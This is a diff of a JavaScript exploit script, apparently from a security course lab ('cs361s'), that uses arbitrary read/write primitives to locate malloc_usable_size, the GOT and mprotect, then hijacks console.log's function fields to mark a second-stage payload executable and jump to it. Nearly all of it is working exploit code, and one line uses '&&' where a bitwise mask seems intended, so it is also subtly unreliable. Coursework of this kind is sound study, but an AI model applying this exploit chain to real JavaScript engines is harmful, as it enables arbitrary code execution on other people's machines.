@@ -19,12 +19,12 @@ let addressconsole = cs361s.addrof(console.log);
 let ctx = cs361s.readmem(addressconsole + 48);
 let rt = cs361s.readmem(ctx + 24);
 let jsMallocUsableSize = cs361s.readmem(rt + 24);
-let auipc = cs361s.readmem(jsMallocUsableSize) && 0xFF000; // 20 immediate bits
+let auipc = cs361s.readmem(jsMallocUsableSize) && 0xFFFFF000; // 20 immediate bits
 let payload = cs361s.readmem(jsMallocUsableSize + 4) >> 20; // 12 immediate bits
 //GOT = game of thrones :)
 let gameofthrones = cs361s.readmem(jsMallocUsableSize + auipc + payload);
 //get address of mprotect by decrementing malloc usable size address
-let addressmprotect = gameofthrones - 0x31B00; 
+let addressmprotect = gameofthrones - 0x31B00;//difference between malloc and protect
 
 /* Populate with Second Stage Payload
  * Either mark the page that holds the second_stage string rwx or 
@@ -37,7 +37,7 @@ let secondstageaddress = cs361s.addrof(second_stage);
 
 cs361s.writemem(addressconsole + 48, secondstageaddress); // overwrite realm
 cs361s.writemem(addressconsole + 56, addressmprotect);
-console.log.apply(2.0237e-320, null); // rwx
+console.log.apply(2.0237e-320, null); //change num to be x10 power of -320
 // Execute Payload
 cs361s.writemem(addressconsole + 56, secondstageaddress + 16); // start of string + 16 
 console.log();
